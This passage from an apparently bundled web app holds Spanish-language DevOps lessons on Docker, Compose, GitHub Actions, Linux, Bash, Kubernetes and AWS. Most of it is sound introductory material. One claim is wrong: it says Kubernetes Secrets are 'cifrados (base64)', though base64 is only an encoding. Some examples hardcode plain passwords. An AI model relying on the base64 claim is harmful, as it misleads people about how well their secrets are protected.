`,completed:!1},{id:"deploy-devops-06-intro-docker",title:'Introduccin a Docker - "En mi mquina funciona"',level:"semi-senior",content:`# Leccin 06: Introduccin a Docker - "En mi mquina funciona"

El mayor problema del deploy es la diferencia de entornos. Tu compu tiene Node 20 y Windows, pero el servidor tiene Node 18 y Linux. Ah es donde entra **Docker**.

## 1. Qu es Docker?
Docker mete tu aplicacin, sus dependencias y el sistema operativo en una "caja" llamada **Contenedor**. 
*   **La promesa:** Si el contenedor corre en tu computadora, correr EXACTAMENTE igual en cualquier servidor del mundo.

## 2. Archivos Fundamentales
*   **Dockerfile:** Las instrucciones para armar la caja. (Ej: "Usa Node 20, copia mis archivos, instala dependencias y corre el puerto 3000").
*   **Docker Image:** El paquete ya armado (como un archivo .exe o .iso).
*   **Docker Container:** La imagen puesta en marcha (el proceso vivo).

## 3. Comandos Bsicos que debes saber
*   \`docker build\`: Crea la imagen.
*   \`docker run\`: Enciende el contenedor.
*   \`docker ps\`: Mira qu contenedores estn corriendo.

---

### Por qu usarlo como Semi-Senior:
Te permite levantar una base de datos local (Redis, Postgres, etc.) con un solo comando sin tener que instalar nada en tu sistema operativo real.

### Ejercicio Mental:
Si tu aplicacin necesita una versin especfica de una librera de procesamiento de imgenes que solo funciona en Linux, cmo te ayuda Docker si t programas en Windows o Mac?
`,completed:!1},{id:"deploy-devops-07-docker-avanzado",title:"Docker Avanzado y Docker Compose",level:"senior",content:`# Leccin 07: Docker Avanzado y Docker Compose

En sistemas profesionales, tu App no es un solo archivo; es un conjunto de servicios (App + DB + Redis + Worker). Manejar eso con comandos individuales es imposible.

## 1. Docker Compose: El Orquestador Local
Con un archivo \`docker-compose.yml\`, defines toda tu arquitectura y la levantas con un solo comando: \`docker-compose up\`.

**Ejemplo de arquitectura profesional:**
\`\`\`yaml
services:
  web:
    build: .
    ports: ["3000:3000"]
    depends_on: ["db"]
  db:
    image: postgres:15
    environment:
      POSTGRES_PASSWORD: password
\`\`\`

## 2. Optimizacin de Imgenes (Multi-stage Builds)
Un Senior no sube imgenes de 1GB. Usa **Multi-stage builds** para separar el entorno de construccin del de ejecucin.
*   **Etapa 1:** Instala TODO (libreras pesadas, compiladores).
*   **Etapa 2:** Solo copia el cdigo compilado a una imagen ultra ligera (Alpine Linux).
*   **Resultado:** Tu imagen baja de 800MB a 50MB.

## 3. Seguridad en Docker
*   **No root:** Nunca corras tu app como usuario \`root\` dentro del contenedor. Si alguien hackea tu app, tendr control total del servidor.
*   **Secretos:** No pases contraseas en el Dockerfile; usa variables de entorno pasadas en tiempo de ejecucin.

---

### Misin Senior:
Tu objetivo es que cualquier desarrollador nuevo pueda clonar el repositorio, escribir \`docker-compose up\` y tener TODO el entorno funcionando en 2 minutos.
`,completed:!1},{id:"deploy-devops-08-cicd-senior",title:"CI/CD con GitHub Actions y Entornos",level:"senior",content:`# Leccin 08: CI/CD con GitHub Actions y Entornos

El **CI/CD** (Continuous Integration / Continuous Deployment) es el alma de DevOps. Es la automatizacin total de la calidad y el despliegue.

## 1. El Pipeline (Flujo de trabajo)
Como Senior, configuras archivos \`.yml\` en GitHub que se ejecutan solos:
1.  **Linter:** Revisa que el cdigo est lindo.
2.  **Test:** Corre las pruebas unitarias e integracin.
3.  **Build:** Intenta compilar el proyecto.
4.  **Deploy:** Si todo lo anterior pas, sube el cdigo automticamente.

## 2. Estrategia de Entornos (Staging vs Production)
Nunca despliegues directo a la web real.
*   **Staging:** Una rplica exacta de produccin pero con una URL secreta. Aqu el equipo de QA (Testing) prueba todo.
*   **Production:** La web que ven los clientes. Solo se toca cuando Staging est verificado al 100%.

## 3. Despliegue progresivo (Blue-Green / Canary)
Cmo actualizar una app que tiene 1 milln de personas conectadas sin que se den cuenta?
*   **Blue-Green:** Levantas la versin nueva (Green) junto a la vieja (Blue). Cuando Green est lista, mueves todo el trfico de golpe. Si algo falla, vuelves a Blue en un segundo.

---

### Visin Senior:
El despliegue no debe ser un evento estresante de "cruzar los dedos". Debe ser un proceso aburrido y automtico que ocurre 10 veces al da sin que nadie se entere.

### Desafo:
Investiga el concepto de **Rollback**. Cmo automatizaras que si la nueva versin de tu app genera muchos errores 500, el sistema vuelva solo a la versin anterior?
`,completed:!1},{id:"deploy-devops-09-escalabilidad-seguridad",title:"Escalabilidad y Seguridad en Produccin",level:"senior",content:`# Leccin 09: Escalabilidad y Seguridad en Produccin

Tener 1.000 usuarios es fcil. Tener 1.000.000 requiere decisiones de arquitectura de alto nivel.

## 1. Escalabilidad Vertical vs Horizontal
*   **Vertical:** Pagar un servidor ms caro (ms RAM/CPU). Tiene un lmite y es muy caro.
*   **Horizontal:** Poner muchos servidores baratos en paralelo. Es el estndar de la industria (nube). Necesitas un **Load Balancer** (Balanceador de Carga) para repartir el trfico entre ellos.

## 2. Statelessness (Sin estado)
Para escalar horizontalmente, tus servidores no pueden guardar archivos localmente (como fotos de perfil).
*   **Senior Solution:** Usa un **Object Storage** (AWS S3) para archivos y una base de datos centralizada. As, no importa a qu servidor llegue el usuario, siempre ve sus datos.

## 3. Seguridad Crtica (Production Hardening)
1.  **HTTPS:** Obligatorio. Usa certificados automticos (Let's Encrypt).
2.  **Secret Management:** No uses archivos \`.env\` en servidores grandes. Usa **Secrets Managers** (AWS Secrets Manager, HashiCorp Vault). Las llaves nunca tocan el disco rgido.
3.  **WAF (Web Application Firewall):** Bloquea ataques DDoS y SQL Injection antes de que lleguen a tu cdigo.

---

### Caso de Decisin Arquitectnica:
Tu App tiene un proceso muy lento (ej: generar un reporte PDF de 1GB).
*   **Solucin Junior:** Hacerlo en el controlador del API (El API se bloquea y nadie ms puede entrar).
*   **Solucin Senior:** Usar una **Arquitectura basada en Mensajes**. Envas la tarea a una "Cola" (Redis/RabbitMQ) y un proceso separado (Worker) lo hace en segundo plano. El usuario recibe un aviso: "Tu reporte estar listo en 5 min".

---

Felicidades, DevOps Lead! Has completado el camino desde subir un HTML a Netlify hasta disear infraestructuras globales resilientes. 
`,completed:!1}]},Gx={id:"devops",title:"DevOps & Cloud Engineering",description:"Domina el arte de la automatizacin, la nube y la cultura DevOps profesional.",completed:!1,track:"Herramientas Esenciales",lessons:[{id:"devops-01-fundamentos",title:"Fundamentos de DevOps y Cultura",level:"junior",content:`# Leccin 1: Fundamentos de DevOps (Cultura, Automatizacin y el Muro)

DevOps no es un rol, es una cultura. Naci para derribar el "Muro de la Confusin" entre Desarrolladores (Dev) y Operaciones/Sistemas (Ops).

## 1. El Problema Clsico (Silos)
*   **Devs:** Quieren cambiar cosas rpido. Su incentivo es la *innovacin*.
*   **Ops:** Quieren estabilidad. Su incentivo es que *nada se rompa*.
*   **Resultado:** Devs lanzan cdigo "por encima del muro" a Ops. Si falla en produccin, se culpan mutuamente.

## 2. La Solucin: CALMS
DevOps se basa en 5 pilares (CALMS):
*   **Culture (Cultura):** Responsabilidad compartida. "You build it, you run it".
*   **Automation (Automatizacin):** Eliminar trabajo manual repetitivo (toil) para evitar errores humanos.
*   **Lean (Eficiencia):** Producir valor en lotes pequeos (commits pequeos, deploys frecuentes).
*   **Measurement (Medicin):** Datos reales sobre performance y estabilidad (Mtricas, Logs).
*   **Sharing (Compartir):** Conocimiento abierto, post-mortems sin culpa.

## 3. El Ciclo Infinito (The Infinite Loop)
Plan -> Code -> Build -> Test -> Release -> Deploy -> Operate -> Monitor -> Plan...

## 4. Conceptos Clave
### CI/CD
Tubera automatizada de entrega de software.
*   **CI (Continuous Integration):** Integrar cdigo frecuentemente (varias veces al da) en un repo compartido, verificado por builds y tests automticos.
*   **CD (Continuous Delivery):** El software siempre est en un estado desplegable.
*   **CD (Continuous Deployment):** Cada cambio que pasa los tests se despliega automticamente a produccin.

### Infraestructura como Cdigo (IaC)
En lugar de configurar servidores manualmente (SSH, click click), defines tu infraestructura en archivos de texto (YAML, HCL).
*   Ejemplos: Terraform, Ansible, CloudFormation.
*   Ventaja: Versionable, reproducible y auditable.

---

### Misin Junior:
Investiga el concepto de "Shift Left" en DevOps. Qu significa y por qu es importante probar *antes* en el ciclo? Escribe un breve prrafo explicndoselo a un compaero no tcnico.
`,completed:!1},{id:"devops-02-linux-basico",title:"Linux Bsico para DevOps",level:"junior",content:'# Leccin 2: Linux Bsico para DevOps (La Terminal es tu Hogar)\n\nLa mayora de los servidores del mundo (la nube) corren Linux. Si no sabes terminal, no eres DevOps.\n\n## 1. Navegacin y Archivos\n*   `pwd`: Dnde estoy? (Print Working Directory).\n*   `ls -la`: Listar todo (incluidos ocultos) con detalles.\n*   `cd`: Cambiar directorio (`cd ..` subir un nivel, `cd ~`: ir a home).\n*   `mkdir -p a/b/c`: Crear carpetas anidadas.\n*   `touch archivo.txt`: Crear archivo vaco.\n*   `cp origen destino`: Copiar (`-r` para carpetas).\n*   `mv origen destino`: Mover o renombrar.\n*   `rm -rf carpeta`: Borrar carpeta y contenido **sin preguntar** (Cuidado!).\n\n## 2. Ver y Editar Contenido\n*   `cat archivo`: Ver todo el contenido.\n*   `head -n 5`: Ver las primeras 5 lneas.\n*   `tail -f log.txt`: Ver el final de un archivo en tiempo real (vital para logs).\n*   `nano` / `vim`: Editores de texto en terminal.\n\n## 3. Permisos (chmod)\nEn Linux, todo archivo tiene permisos para: **Owner**, **Group**, **Others**.\nTipos: **R**ead (4), **W**rite (2), e**X**ecute (1).\n\n*   `chmod 777 archivo`: Todo el mundo puede hacer todo (Peligroso).\n    *   7 = 4+2+1 (RWX) para Owner.\n    *   7 = 4+2+1 (RWX) para Group.\n    *   7 = 4+2+1 (RWX) para Others.\n*   `chmod 644 archivo`: Owner lee/escribe, el resto solo lee (Estndar para archivos web).\n*   `chmod +x script.sh`: Dar permiso de ejecucin.\n\n## 4. Gestin de Procesos\n*   `ps aux`: Ver todos los procesos corriendo.\n*   `top` / `htop`: Administrador de tareas interactivo (CPU, RAM).\n*   `kill PID`: Matar un proceso por su ID.\n*   `killall nginx`: Matar todos los procesos con ese nombre.\n\n## 5. Variables de Entorno\nConfiguraciones que viven en la memoria del sistema, no en el cdigo.\n*   `export MI_VAR="hola"`: Crear variable temporal.\n*   `echo $MI_VAR`: Ver valor.\n*   `env`: Listar todas.\n\n---\n\n### Misin Junior:\n1. Crea una estructura de carpetas `app/logs` y `app/src`.\n2. Crea un archivo `server.js` en `src`.\n3. Qutale todos los permisos de lectura al archivo (`chmod 000`) e intenta leerlo con `cat`. Qu pasa?\n4. Devulvele permisos de lectura y escritura solo al dueo (`chmod 600`).\n',completed:!1},{id:"devops-03-bash-scripting",title:"Bash Scripting Bsico",level:"junior",content:`# Leccin 3: Bash Scripting Bsico (Automatiza tu Vida)

Si tienes que hacerlo ms de dos veces, escribe un script. Bash es el lenguaje de pegamento de los sistemas.

## 1. El Shebang
Todo script de bash empieza con:
\`\`\`bash
#!/bin/bash
\`\`\`
Esto le dice al sistema "usa el intrprete bash para ejecutar esto".

## 2. Variables y Argumentos
\`\`\`bash
#!/bin/bash
NOMBRE="Mundo"
echo "Hola $NOMBRE"

# Argumentos que pasas al script (./script.sh arg1 arg2)
echo "El primer argumento es: $1"
\`\`\`

## 3. Condicionales
\`\`\`bash
if [ -f "archivo.txt" ]; then
    echo "El archivo existe."
else
    echo "El archivo no existe, crendolo..."
    touch archivo.txt
fi
\`\`\`

## 4. Bucles
\`\`\`bash
# Iterar sobre archivos
for archivo in *.jpg; do
    echo "Procesando $archivo..."
done
\`\`\`

## 5. Automatizacin con Cron (Cron Jobs)
El reloj despertador de Linux.
\`crontab -e\`: Editar la tabla de cron.

Formato:
\`minuto hora da_mes mes da_semana comando\`

Ejemplos:
*   \`* * * * * /scripts/backup.sh\`: Ejecutar cada minuto.
*   \`0 3 * * * /scripts/backup.sh\`: Ejecutar todos los das a las 3:00 AM.
*   \`0 0 * * 5 /scripts/reporte.sh\`: Ejecutar cada viernes a medianoche.

---

### Misin Junior:
Escribe un script \`backup_logs.sh\` que:
1. Cree una carpeta \`backup\` si no existe.
2. Copie todos los archivos \`.log\` de la carpeta actual a \`backup\`.
3. Agregue la fecha actual al nombre del archivo copiado (ej: \`app_2023-10-27.log\`).
4. Imprima "Backup completado".
Tip: Usa \`FECHA=$(date +%Y-%m-%d)\` para obtener la fecha.
`,completed:!1},{id:"devops-04-git-flow",title:"Git aplicado a DevOps",level:"junior",content:"# Leccin 4: Git aplicado a flujo real (DevOps Flow)\n\nEn DevOps, Git no es solo para guardar cdigo, es el gatillo de la automatizacin (GitOps).\n\n## 1. El Flujo de Trabajo (Git Flow Simplificado)\n1.  **Main:** Siempre desplegable. Protegida. Nadie comitea directo aqu.\n2.  **Feature Branches:** `feat/nueva-cosa`. Ramas de vida corta.\n3.  **Pull Request (PR):** El momento de la verdad. Aqu se ejecutan los tests automticos (CI).\n4.  **Merge:** Solo si CI pasa y hay aprobacin humana.\n5.  **Tag release:** `v1.0.0`. Esto dispara el despliegue a produccin.\n\n## 2. Merge vs. Rebase en Equipos\n*   **Merge:** Mantiene la historia real (con errores y bifurcaciones). Facilita ver cundo se integr una feature.\n*   **Rebase:** Mantiene historia lineal. Ms limpio, pero peligroso en ramas compartidas (reescribe historia).\n    *   *Regla DevOps:* Usa `rebase` en tu rama local para actualizarte con `main` antes de subir. Usa `merge` (o Squash Merge) al integrar el PR a `main`.\n\n## 3. Conventional Commits y CI\nLos mensajes de commit son input para las mquinas.\n*   Si el commit dice `fix: ...`, la pipeline de release sabe que debe subir la versin PATCH (v1.0.0 -> v1.0.1).\n*   Si dice `feat: ...`, sube MINOR (v1.0.0 -> v1.1.0).\n*   Si dice `BREAKING CHANGE:`, sube MAJOR (v1.0.0 -> v2.0.0).\n\n---\n\n### Misin Junior:\nSimula un flujo completo:\n1. Crea una rama `feat/test-pipeline`.\n2. Haz un cambio y un commit: `feat: agrega script de prueba`.\n3. Haz push.\n4. Imagina que otro dev hizo cambios en `main`. Simlalo haciendo un commit directo en `main` localmente.\n5. Actualiza tu rama `feat` con los cambios de `main` usando `git rebase main` (para traer lo nuevo sin crear un merge commit sucio en tu rama).\n6. Resuelve conflictos si los hay.\n",completed:!1},{id:"devops-05-docker-basico",title:"Docker Bsico",level:"junior",content:`# Leccin 6: Docker Bsico (Contenedores)

"En mi mquina funciona". La frase ms odiada en Ops. Docker soluciona esto empaquetando la app con TODO lo que necesita para correr.

## 1. Qu es un Contenedor?
Es como una mquina virtual, pero mucho ms ligera. Comparte el kernel del sistema operativo del host, pero tiene su propio sistema de archivos, red y procesos aislados.

## 2. Imagen vs. Contenedor
*   **Imagen:** Es el "plano" o la "clase". Un archivo inmutable de solo lectura. (Ej: \`node:18-alpine\`).
*   **Contenedor:** Es la "instancia" o el "objeto". La imagen en ejecucin. Puedes tener 100 contenedores de la misma imagen.

## 3. Dockerfile
La receta para cocinar tu imagen.

\`\`\`dockerfile
# 1. Base Image (Sistema Operativo mnimo + Node)
FROM node:18-alpine

# 2. Directorio de trabajo dentro del contenedor
WORKDIR /app

# 3. Copiar dependencias (primero package.json para aprovechar cach)
COPY package*.json ./

# 4. Instalar dependencias
RUN npm install

# 5. Copiar el resto del cdigo
COPY . .

# 6. Exponer puerto (documentacin)
EXPOSE 3000

# 7. Comando de arranque (CMD)
CMD ["node", "src/index.js"]
\`\`\`

## 4. Comandos Esenciales
*   \`docker build -t mi-app .\`: Construir la imagen desde el Dockerfile actual.
*   \`docker run -p 8080:3000 mi-app\`: Correr contenedor. Mapea el puerto 3000 del contenedor al 8080 de tu PC.
*   \`docker ps\`: Ver contenedores corriendo.
*   \`docker stop <ID>\`: Detener contenedor.

## 5. Docker Compose
Orquestador simple para correr mltiples contenedores (App + Base de Datos).
Archivo: \`docker-compose.yml\`

\`\`\`yaml
version: '3.8'
services:
  web:
    build: .
    ports:
      - "3000:3000"
  db:
    image: postgres:13
    environment:
      POSTGRES_PASSWORD: secreto
\`\`\`
Comando: \`docker-compose up\` (Levanta todo el entorno).

---

### Misin Junior:
1. Crea un \`index.js\` simple que imprima "Hola Docker" y se mantenga vivo (o un servidor web simple).
2. Escribe el \`Dockerfile\`.
3. Construye la imagen (\`build\`).
4. Crrela (\`run\`).
5. Verifica que funciona.
`,completed:!1},{id:"devops-06-intro-ci",title:"Intro a Git Hub Actions (CI)",level:"junior",content:`# Leccin 5: Introduccin a CI con GitHub Actions (Tu Primer Pipeline)

La Integracin Continua (CI) es tener un robot que prueba tu cdigo cada vez que lo guardas.

## 1. Qu es un Pipeline?
Una serie de pasos automticos que se ejecutan secuencialmente.
Ejemplo: Descargar cdigo -> Instalar dependencias -> Correr Lint -> Correr Tests -> Construir.

## 2. GitHub Actions
La herramienta de CI/CD integrada en GitHub. Se configura con archivos YAML en \`.github/workflows/\`.

## 3. Componentes de un Workflow
*   **Event (on):** Cundo corre? (push, pull_request, schedule).
*   **Job:** Una unidad de trabajo que corre en una mquina virtual (Runner).
*   **Step:** Un paso individual (comando o accin) dentro del Job.

## 4. Ejemplo Bsico: Hello World CI
Archivo: \`.github/workflows/demo.yml\`

\`\`\`yaml
name: Demo Pipeline

on: [push] # Se ejecuta en cada push

jobs:
  saludo:
    runs-on: ubuntu-latest # Mquina Linux de Microsoft
    steps:
      - name: Checkout del cdigo
        uses: actions/checkout@v2 # Accin prefabricada para bajar tu repo
      
      - name: Imprimir mensaje
        run: echo "Hola desde GitHub Actions! El commit fue: \${{ github.sha }}"
      
      - name: Verificar archivos
        run: ls -la
\`\`\`

## 5. Fallar el Pipeline (Build Failed)
Si cualquier comando devuelve un cdigo de error (exit code != 0), el pipeline se detiene y se marca en rojo.
\`\`\`yaml
      - name: Correr tests
        run: npm test # Si los tests fallan, npm devuelve 1 y el CI falla.
\`\`\`

---

### Misin Junior:
1. En un repositorio de GitHub, crea la carpeta \`.github/workflows\`.
2. Crea un archivo \`ci.yml\`.
3. Configura un job que imprima la versin de node (\`node -v\`) y la versin de npm (\`npm -v\`).
4. Haz push y mira la pestaa "Actions" en tu repositorio. Ve a tu robot trabajar!
`,completed:!1},{id:"devops-07-proyecto-final-junior",title:"Proyecto Final Junior DevOps",level:"junior",content:'# Proyecto Final Nivel Junior: "El Pipeline Bsico"\n\nEs hora de integrar todo. Vas a simular el da uno de un ingeniero DevOps Junior.\n\n## Objetivo\nDockerizar una aplicacin simple y crear un pipeline de CI que verifique que la imagen se construye correctamente en cada push.\n\n## Pasos\n\n### 1. La Aplicacin (El Asset)\nCrea una aplicacin Node.js extremadamente simple.\n*   `app.js`: Un servidor web con Express o http nativo que responda "Hola DevOps" en el puerto 3000.\n*   `package.json`: Con sus scripts de start.\n\n### 2. Contenerizacin (Docker)\n*   Crea el `Dockerfile` optimizado (usa imgenes `alpine`).\n*   Crea un archivo `.dockerignore` para no copiar `node_modules` ni `.git` dentro de la imagen.\n*   Prueba localmente: `docker build` y `docker run`. Asegrate de poder acceder a `localhost:3000`.\n\n### 3. Automatizacin Local (Bash)\nCrea un script `dev.sh` que haga lo siguiente:\n1.  Detenga cualquier contenedor anterior de esta app.\n2.  Construya la imagen nueva.\n3.  Corra el contenedor en modo "detached" (`-d`).\n4.  Muestre los logs del contenedor.\nDale permisos de ejecucin (`chmod +x`).\n\n### 4. Integracin Continua (GitHub Actions)\nConfigura un workflow en `.github/workflows/docker-build.yml` que:\n1.  Se active en `push` a `main`.\n2.  Haga checkout del cdigo.\n3.  Intente construir la imagen de Docker (`docker build .`).\n    *   *Nota:* Los runners de GitHub ya tienen Docker instalado.\n4.  Si el build falla, el pipeline debe fallar.\n\n## Entregable (Evaluacin)\nDeberas tener un repositorio con:\n*   `src/`, `Dockerfile`, `.dockerignore`\n*   `scripts/dev.sh`\n*   `.github/workflows/build.yml`\n*   Un `README.md` explicando cmo correr tu proyecto con un solo comando.\n\nFelicidades! Acabas de crear tu primer entorno de desarrollo profesional y automatizado.\n',completed:!1},{id:"devops-08-docker-avanzado",title:"Docker Avanzado",level:"semi-senior",content:`# Leccin 8: Docker Avanzado (Optimizacin y Seguridad)

Ya sabes correr un contenedor. Ahora vamos a hacerlos **rpidos, ligeros y seguros**.

## 1. Multi-stage Builds (El secreto de las imgenes pequeas)
Por qu tu imagen de "Hola Mundo" pesa 1GB? Porque ests copiando \`node_modules\` de desarrollo y herramientas de compilacin que no necesitas en produccin.

**Solucin:** Usa etapas.
1.  **Etapa Build:** Instala todo, compila TypeScript, corre tests.
2.  **Etapa Run:** Copia *solo* lo que compilaste a una imagen limpia y ligera.

\`\`\`dockerfile
# Stage 1: Build
FROM node:18 AS builder
WORKDIR /app
COPY package*.json ./
RUN npm install
COPY . .
RUN npm run build

# Stage 2: Production
FROM node:18-alpine
WORKDIR /app
# Copiamos solo los artefactos construidos del Stage 1
COPY --from=builder /app/dist ./dist
COPY --from=builder /app/package*.json ./
RUN npm install --production
CMD ["node", "dist/index.js"]
\`\`\`
*Resultado:* Imagen baja de 800MB a 80MB.

## 2. Volmenes (Persistencia de Datos)
Los contenedores son efmeros. Si borras el contenedor, sus datos mueren.
Para bases de datos, necesitas **Volmenes**.

\`\`\`bash
# Crear volumen
docker volume create mis-datos

# Usarlo
docker run -v mis-datos:/var/lib/mysql mysql
\`\`\`
Ahora, aunque mates el contenedor de MySQL, los datos viven en \`mis-datos\`.

## 3. Docker Networks
Por defecto, los contenedores no se ven entre s por nombre.
Crea una red para que tu App hable con tu DB usando DNS interno.

\`\`\`bash
docker network create mi-red
docker run --network mi-red --name db mysql
docker run --network mi-red --name app mi-app
\`\`\`
(Desde \`app\`, ahora puedes conectar a \`mysql://db:3306\`).

## 4. Seguridad Bsica
*   **No corras como root:** Crea un usuario en el Dockerfile (\`USER node\`). Si hackean la app, no tienen control total.
*   **Escanea imgenes:** Usa \`docker scan mi-imagen\` para ver vulnerabilidades conocidas.
*   **Imgenes Oficiales:** Usa siempre imgenes base oficiales y especficas (\`node:18-alpine\` es mejor que \`node:latest\`).

---

### Misin Semi-Senior:
1. Toma tu proyecto anterior.
2. Convierte el Dockerfile a **Multi-stage build**.
3. Implementa un **Volume** para guardar logs fuera del contenedor.
4. Escanea tu imagen con \`docker scan\` (o trivy) y reporta cuntas vulnerabilidades "High" encontraste.
`,completed:!1},{id:"devops-09-kubernetes-basico",title:"Kubernetes Bsico",level:"semi-senior",content:`# Leccin 9: Kubernetes Bsico (El Estndar de la Orquestacin)

Docker es para un servidor. Kubernetes (K8s) es para un cluster de 100 servidores (nodos) que actan como uno solo.

## 1. Conceptos Clave
Kubernetes es declarativo. T escribes un YAML ("Quiero 3 rplicas de mi app") y K8s hace lo necesario para cumplirlo.

## 2. Pod (La unidad atmica)
No corres "contenedores" directamente. Corres **Pods**.
*   Un Pod envuelve uno o ms contenedores (normalmente uno).
*   Tiene su propia IP interna.
*   Es mortal. Si muere, K8s crea otro nuevo (con otra IP).

## 3. Deployment (El Gerente)
Gestiona los Pods.
*   Define qu imagen usar.
*   Define cuntas rplicas quieres.
*   Se encarga de las actualizaciones (Rolling Update) sin downtime.

\`deployment.yaml\`:
\`\`\`yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: mi-app
spec:
  replicas: 3
  selector:
    matchLabels:
      app: mi-web
  template:
    metadata:
      labels:
        app: mi-web
    spec:
      containers:
      - name: web
        image: nginx:alpine
        ports:
        - containerPort: 80
\`\`\`

## 4. Comandos Kubectl
\`kubectl\` es el control remoto de tu cluster.
*   \`kubectl apply -f archivo.yaml\`: Crea o actualiza recursos.
*   \`kubectl get pods\`: Ver pods.
*   \`kubectl describe pod <nombre>\`: Ver detalles y logs de eventos (status, errores).
*   \`kubectl logs <nombre>\`: Ver stdout del contenedor.

---

### Misin Semi-Senior:
Necesitas un cluster local. Instala **Minikube** o activa **Kubernetes en Docker Desktop**.
1. Crea el archivo \`deployment.yaml\` de arriba.
2. Aplcalo: \`kubectl apply -f deployment.yaml\`.
3. Verifica que hay 3 pods corriendo: \`kubectl get pods\`.
4. Borra un pod manualmente (\`kubectl delete pod <nombre>\`).
5. Mira rpido \`kubectl get pods\`. K8s habr creado uno nuevo inmediatamente para mantener las 3 rplicas! (Self-healing).
`,completed:!1},{id:"devops-10-kubernetes-intermedio",title:"Kubernetes Intermedio",level:"semi-senior",content:`# Leccin 10: Kubernetes Intermedio (Exponiendo tu App)

Tus pods estn corriendo, pero nadie puede entrar. Estn aislados en la red interna del cluster.

## 1. Service (La Puerta de Entrada)
Un objeto que agrupa tus Pods bajo una sola IP estable. Balancea la carga (Load Balancing) entre ellos.

Tipos de Servicios:
*   **ClusterIP:** Solo accesible desde dentro del cluster (Default). Para bases de datos internas.
*   **NodePort:** Abre un puerto en cada nodo del cluster (ej: 30000). Raro en produccin.
*   **LoadBalancer:** Pide un balanceador de carga real a tu proveedor Cloud (AWS ALB, Google LB). Te da una IP pblica real.

\`service.yaml\`:
\`\`\`yaml
apiVersion: v1
kind: Service
metadata:
  name: mi-servicio
spec:
  selector:
    app: mi-web # Debe coincidir con el label del Pod
  ports:
    - protocol: TCP
      port: 80 # Puerto del servicio
      targetPort: 80 # Puerto del contenedor
  type: LoadBalancer
\`\`\`

## 2. Ingress (El recepcionista inteligente)
Si tienes 50 microservicios, no quieres pagar 50 LoadBalancers.
Usas un **Ingress Controller** (como Nginx).
*   Un solo LoadBalancer para entrar.
*   Reglas de ruteo basadas en host o path.
    *   \`api.misitio.com\` -> Servicio API
    *   \`misitio.com/blog\` -> Servicio Blog

## 3. ConfigMaps y Secrets
Nunca pongas configuracin en tu imagen de Docker. Inyctala.
*   **ConfigMap:** Datos no confidenciales (URLs, colores, flags). Se montan como variables de entorno o archivos.
*   **Secret:** Datos confidenciales (Passwords, API Keys). Se guardan cifrados (base64) en K8s.

---

### Misin Semi-Senior:
1. Crea un \`Service\` tipo \`NodePort\` o \`LoadBalancer\` para tu deployment anterior.
2. Accede a tu Nginx desde tu navegador (localhost:puerto o IP).
3. Crea un ConfigMap con \`COLOR_FONDO=blue\`.
4. Modifica tu Deployment para leer esa variable de entorno (aunque Nginx no la use, verifica con \`kubectl exec\` que la variable existe dentro del pod).
`,completed:!1},{id:"devops-11-ci-cd-avanzado",title:"CI/CD Avanzado",level:"semi-senior",content:`# Leccin 11: CI/CD Avanzado (Pipeline Completo)

Vamos a profesionalizar el pipeline. No basta con que compile.

## 1. Estructura de un Pipeline Real
1.  **Lint:** Revisa estilo de cdigo. Falla rpido.
2.  **Test:** Unitarios y de Integracin.
3.  **Build:** Construye la imagen Docker.
4.  **Permisos/Seguridad:** Escaneo de vulnerabilidades.
5.  **Deploy Staging:** Despliega a un entorno de pruebas.
6.  **Tests E2E:** Cypress/Playwright contra Staging.
7.  **Deploy Produccin:** Solo si todo lo anterior pas.

## 2. GitHub Actions Secrets
Nunca pongas contraseas en \`ci.yml\`.
Ve a \`Settings > Secrets and variables > Actions\`.
Crea \`DOCKER_USERNAME\` y \`DOCKER_PASSWORD\`.

Uso en YAML:
\`\`\`yaml
- name: Login to Docker Hub
  uses: docker/login-action@v2
  with:
    username: \${{ secrets.DOCKER_USERNAME }}
    password: \${{ secrets.DOCKER_PASSWORD }}
\`\`\`

## 3. Artefactos y Cach
Para que el pipeline sea rpido:
*   **Cache:** Guarda \`node_modules\` entre ejecuciones para no instalar siempre desde cero.
*   **Artifacts:** Pasa archivos (ej: carpeta \`dist/\` o reportes de test) de un Job a otro.

---

### Misin Semi-Senior:
Mejora tu pipeline de GitHub Actions:
1.  Agrega un Job de Linting (ESLint).
2.  Configura Secretos para loguearte en Docker Hub.
3.  Si Test y Lint pasan, construye la imagen y sbela (Push) a Docker Hub con el tag \`latest\` y el SHA del commit.
`,completed:!1},{id:"devops-12-cloud-fundamentos",title:"Fundamentos Cloud (AWS)",level:"semi-senior",content:`# Leccin 12: Cloud Fundamentos (La Nube no es mgica)

La nube es simplemente usar la computadora de otro (Amazon, Google, Microsoft) y pagar por segundo.

## 1. Modelos de Servicio
*   **IaaS (Infrastructure as a Service):** Te alquilan el hardware virtual (CPU, Disco, Red). T instalas el OS y todo lo dems.
    *   Ej: AWS EC2, Google Compute Engine.
    *   *Control total, responsabilidad total.*
*   **PaaS (Platform as a Service):** Te dan la plataforma para correr tu cdigo. Ellos manejan el OS y parches.
    *   Ej: Heroku, AWS Elastic Beanstalk, Vercel.
    *   *Menos control, mayor velocidad.*
*   **SaaS (Software as a Service):** Usas el software terminado.
    *   Ej: Gmail, Salesforce, Jira.

## 2. AWS 101 (Amazon Web Services)
El lder del mercado. Conceptos bsicos:
*   **Region:** Ubicacin fsica (ej: \`us-east-1\` Virginia). Todo recurso vive en una regin.
*   **EC2 (Elastic Compute Cloud):** Servidores virtuales.
*   **S3 (Simple Storage Service):** Almacenamiento de objetos (archivos ilimitados). Como Dropbox para devs.
*   **IAM (Identity and Access Management):** Quin puede hacer qu. Usuarios y Roles. **Nunca uses tu usuario Root para trabajar.**

## 3. Seguridad en la Nube
Modelo de Responsabilidad Compartida:
*   AWS es responsable de la seguridad **DE** la nube (fsica, hardware).
*   T eres responsable de la seguridad **EN** la nube (tus datos, puertos abiertos, contraseas).

---

### Misin Semi-Senior:
Crea una cuenta gratuita en AWS (Free Tier).
1. Crea un usuario IAM con permisos de Administrador (no uses Root). Configura MFA (Autenticacin de 2 pasos).
2. Lanza una instancia EC2 (t2.micro - gratis).
3. Conctate por SSH e instala Nginx.
4. Abre el puerto 80 en el "Security Group" (Firewall).
5. Visita la IP pblica y ve tu servidor funcionando.
6. **IMPORTANTE:** Termina (Terminate) la instancia al acabar para no gastar saldo.
`,completed:!1},{id:"devops-13-terraform-intro",title:"IaC con Terraform",level:"semi-senior",content:`# Leccin 13: Infraestructura como Cdigo (Intro a Terraform)

Hacer click en la consola de AWS es de amateurs. No es reproducible. Si borras todo por error, cmo lo recuperas?
IaC permite versionar tu infraestructura con Git.

## 1. Qu es Terraform?
